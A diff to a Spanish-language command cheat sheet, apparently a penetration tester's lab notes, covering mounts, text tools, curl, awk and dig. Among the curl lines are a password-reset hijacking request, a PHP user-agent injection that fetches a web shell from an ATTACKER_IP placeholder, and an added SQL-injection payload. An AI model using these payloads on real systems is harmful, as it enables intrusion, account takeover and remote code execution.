@@ -29,6 +29,9 @@ mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs
 sudo mount -t cifs //10.16.22.245/SCANNERDOC /mnt/ -o user=USER,vers=2.0
 
 # manipulacion de texto
+pdftotext -layout origen.pdf origen.txt
+pdftotext -eol unix origen.pdf origen.txt
+--------------------
 tr '\n' ',' < tplinkList.txt
 paste -sd "," FILE  # agrega una coma entre palabras
 head /dev/urandom | tr -dc A-Za-z0-9 | head -c 10 ; echo ' ' # generador de passwords
@@ -39,6 +42,7 @@ sed '/^[[:space:]]*$/d' # elimina los espacios
 --------------------
 curl 'http://10.10.154.13/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=test@customer.acmeitsupport.thm' # reset password hijacking
 curl -A “<?php file_put_contents(‘shell.php’,file_get_contents(‘http://{ATTACKER_IP}/shell.php'))?>" -s http://{MACHINE_IP}%
+curl -s -X POST URL --data-urlencode "email=admin@admin.com'-- -"  | grep '<h2>'
 ------------------
 awk '{print "https://"$1}'
 awk '{print $1 ":" $2}'
@@ -184,3 +188,6 @@ https://jvns.ca/blog/2021/11/04/how-do-you-tell-if-a-problem-is-caused-by-dns/
 dig wizardzines.com
 dig @1.1.1.1 domain.com
 dig SOA wizardzines.com
+
+# virtualbox fix multipass
+systemctl stop snap.multipass.multipassd.service
